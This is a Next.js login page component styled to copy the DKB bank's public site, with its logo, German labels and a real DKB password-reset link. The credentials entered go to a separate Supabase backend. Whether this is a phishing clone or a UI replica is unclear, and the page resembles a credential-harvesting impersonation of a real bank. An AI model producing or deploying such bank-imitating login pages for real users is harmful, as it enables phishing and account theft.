"use client"

import { type FormEvent, useState } from "react"
import { useRouter } from "next/navigation"
import { supabase } from "@/lib/supabase"
import DKBLogo from "@/components/DKBLogo"
import Icon from "@/components/Icon"

export default function LoginPage() {
  const router = useRouter()
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [step, setStep] = useState<"username" | "password">("username")
  const [error, setError] = useState<string | null>(null)
  const [loading, setLoading] = useState(false)

  async function handleUsernameSubmit(e: FormEvent) {
    e.preventDefault()
    if (!username.trim()) return
    setStep("password")
  }

  async function handlePasswordSubmit(e: FormEvent) {
    e.preventDefault()
    setError(null)
    setLoading(true)

    const { error } = await supabase.auth.signInWithPassword({
      email: username,
      password,
    })

    if (error) {
      setError(error.message === "Invalid login credentials"
        ? "Anmeldename oder Passwort falsch."
        : error.message)
      setLoading(false)
      return
    }

    router.push("/dashboard")
  }

  return (
    <div className="min-h-screen flex flex-col" style={{ backgroundColor: "#f3f9fe" }}>
      {/* HEADER matching DKB public site */}
      <header className="bg-white" style={{ borderBottom: "1px solid rgba(8,76,128,0.21)" }}>
        <div className="mx-auto" style={{ maxWidth: "1350px", padding: "0 24px" }}>
          <div style={{
            display: "flex",
            alignItems: "center",
            justifyContent: "space-between",
            height: "64px"
          }}>
            <div style={{ flex: "0 0 33%" }}>
              <a href="/" className="flex items-center" style={{ textDecoration: "none" }}>
                <DKBLogo style={{ height: "32px", width: "auto", color: "#006ac7" }} />
              </a>
            </div>
            <div style={{ flex: "0 0 33%", display: "flex", justifyContent: "center" }}>
              {/* desktop nav would go here */}
            </div>
            <div style={{ flex: "0 0 33%", display: "flex", justifyContent: "flex-end" }}>
              <a
                href="/"
                className="no-underline inline-flex items-center gap-2 px-[18px] py-[13px] rounded-[6px] font-[500] text-[17px]"
                style={{
                  color: "#006ac7",
                  border: "1px solid #006ac7",
                  transition: "all 0.2s"
                }}
              >
                <Icon name="lock" className="w-4 h-4" />
                Anmelden
              </a>
            </div>
          </div>
        </div>
      </header>

      {/* LOGIN FORM */}
      <main style={{
        flex: 1,
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        padding: "32px 16px"
      }}>
        <div style={{
          width: "100%",
          maxWidth: "400px",
          backgroundColor: "#fff",
          borderRadius: "12px",
          boxShadow: "0 2px 6px rgba(4,94,184,0.12)",
          border: "1px solid rgba(8,76,128,0.21)",
          padding: "32px"
        }}>
          <div style={{ display: "flex", justifyContent: "center", marginBottom: "32px" }}>
            <DKBLogo style={{ height: "28px", width: "auto", color: "#006ac7" }} />
          </div>

          {step === "username" ? (
            <form onSubmit={handleUsernameSubmit}>
              <div style={{ position: "relative", marginBottom: "20px" }}>
                <input
                  id="anmeldename"
                  type="text"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  required
                  autoFocus
                  autoComplete="username"
                  style={{
                    width: "100%",
                    height: "56px",
                    padding: "20px 16px 4px",
                    fontSize: "17px",
                    fontFamily: "inherit",
                    color: "rgba(13,14,15,0.95)",
                    backgroundColor: "transparent",
                    border: "1px solid rgba(8,76,128,0.21)",
                    borderRadius: "6px",
                    outline: "none",
                    boxSizing: "border-box",
                    transition: "border-color 0.2s"
                  }}
                  onFocus={(e) => { e.target.style.borderColor = "rgba(9,118,214,0.76)"; e.target.style.borderWidth = "2px"; }}
                  onBlur={(e) => { e.target.style.borderColor = "rgba(8,76,128,0.21)"; e.target.style.borderWidth = "1px"; }}
                />
                <label
                  htmlFor="anmeldename"
                  style={{
                    position: "absolute",
                    left: "16px",
                    top: username ? "4px" : "18px",
                    fontSize: username ? "15px" : "17px",
                    color: username ? "#006ac7" : "rgba(15,47,71,0.66)",
                    transition: "all 0.15s ease",
                    pointerEvents: "none",
                    fontFamily: "inherit"
                  }}
                >
                  Anmeldename
                </label>
              </div>

              <button
                type="submit"
                disabled={!username.trim()}
                style={{
                  width: "100%",
                  height: "56px",
                  backgroundColor: username.trim() ? "#0a59a8" : "rgba(33,51,65,0.2)",
                  color: username.trim() ? "#fff" : "rgba(33,51,65,0.4)",
                  border: "none",
                  borderRadius: "6px",
                  fontSize: "17px",
                  fontWeight: 500,
                  fontFamily: "inherit",
                  cursor: username.trim() ? "pointer" : "not-allowed",
                  transition: "background-color 0.2s"
                }}
                onMouseOver={(e) => { if (username.trim()) e.currentTarget.style.backgroundColor = "#134e8a"; }}
                onMouseOut={(e) => { if (username.trim()) e.currentTarget.style.backgroundColor = "#0a59a8"; }}
              >
                Weiter
              </button>
            </form>
          ) : (
            <form onSubmit={handlePasswordSubmit}>
              <div style={{ position: "relative", marginBottom: "16px" }}>
                <input
                  id="passwort"
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                  autoFocus
                  autoComplete="current-password"
                  style={{
                    width: "100%",
                    height: "56px",
                    padding: "20px 16px 4px",
                    fontSize: "17px",
                    fontFamily: "inherit",
                    color: "rgba(13,14,15,0.95)",
                    backgroundColor: "transparent",
                    border: "1px solid rgba(8,76,128,0.21)",
                    borderRadius: "6px",
                    outline: "none",
                    boxSizing: "border-box",
                    transition: "border-color 0.2s"
                  }}
                  onFocus={(e) => { e.target.style.borderColor = "rgba(9,118,214,0.76)"; e.target.style.borderWidth = "2px"; }}
                  onBlur={(e) => { e.target.style.borderColor = "rgba(8,76,128,0.21)"; e.target.style.borderWidth = "1px"; }}
                />
                <label
                  htmlFor="passwort"
                  style={{
                    position: "absolute",
                    left: "16px",
                    top: password ? "4px" : "18px",
                    fontSize: password ? "15px" : "17px",
                    color: password ? "#006ac7" : "rgba(15,47,71,0.66)",
                    transition: "all 0.15s ease",
                    pointerEvents: "none",
                    fontFamily: "inherit"
                  }}
                >
                  Passwort
                </label>
              </div>

              {error && (
                <div style={{ fontSize: "15px", color: "#c22813", marginBottom: "12px", padding: "0 4px" }}>
                  {error}
                </div>
              )}

              <button
                type="submit"
                disabled={loading || !password}
                style={{
                  width: "100%",
                  height: "56px",
                  backgroundColor: (loading || !password) ? "rgba(33,51,65,0.2)" : "#0a59a8",
                  color: (loading || !password) ? "rgba(33,51,65,0.4)" : "#fff",
                  border: "none",
                  borderRadius: "6px",
                  fontSize: "17px",
                  fontWeight: 500,
                  fontFamily: "inherit",
                  cursor: (loading || !password) ? "not-allowed" : "pointer",
                  transition: "background-color 0.2s"
                }}
                onMouseOver={(e) => { if (!loading && password) e.currentTarget.style.backgroundColor = "#134e8a"; }}
                onMouseOut={(e) => { if (!loading && password) e.currentTarget.style.backgroundColor = "#0a59a8"; }}
              >
                {loading ? "Wird geladen..." : "Anmelden"}
              </button>

              <div style={{ textAlign: "center", marginTop: "16px" }}>
                <button
                  type="button"
                  onClick={() => setStep("username")}
                  style={{
                    background: "none",
                    border: "none",
                    color: "#006ac7",
                    fontSize: "15px",
                    fontFamily: "inherit",
                    cursor: "pointer",
                    padding: 0,
                    textDecoration: "underline"
                  }}
                >
                  Zurück
                </button>
              </div>

              <div style={{ textAlign: "center", marginTop: "12px" }}>
                <a
                  href="https://banking.dkb.de/reset-password"
                  style={{
                    color: "#006ac7",
                    fontSize: "15px",
                    fontFamily: "inherit",
                    textDecoration: "underline"
                  }}
                >
                  Passwort vergessen?
                </a>
              </div>
            </form>
          )}
        </div>
      </main>
    </div>
  )
}
